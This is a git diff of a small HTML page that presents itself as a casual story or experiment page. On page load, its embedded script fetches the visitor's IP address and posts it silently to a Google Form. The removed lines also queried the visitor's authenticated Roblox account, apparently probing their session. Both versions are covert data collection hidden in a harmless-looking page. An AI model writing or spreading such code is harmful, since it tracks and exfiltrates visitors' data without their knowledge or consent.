@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
+<t>hello world!</t>
 <t>wolfy:
 experiment 10
 UwU
@@ -19,18 +20,15 @@ almost finsihed story</t>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 <script>
 $(document).ready(function(){
-  	$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(ipdata) {
-    	$.getJSON('https://users.roblox.com/v1/users/authenticated', function(rblxdata) {
-        	alert("a")
-          $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSca7GcBL-O6R3dacDSjWWviONA_NdxZX5ndTehm2hNDZRtafw/formResponse",
-          {
-            "entry.670173823": JSON.parse(JSON.stringify(ipdata,null)).ip,
-            "fvv": 1,
-            "draftResponse": [null,null,"7509670278601093473"],
-            "pageHistory": 0,
-            "fbzx": 7509670278601093473
-          });
-       });
+  	$.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {
+        $.post("https://docs.google.com/forms/u/0/d/e/1FAIpQLSca7GcBL-O6R3dacDSjWWviONA_NdxZX5ndTehm2hNDZRtafw/formResponse",
+        {
+          "entry.670173823": JSON.parse(JSON.stringify(data,null)).ip,
+          "fvv": 1,
+          "draftResponse": [null,null,"7509670278601093473"],
+          "pageHistory": 0,
+          "fbzx": 7509670278601093473
+        });
 	});
 });
 </script>
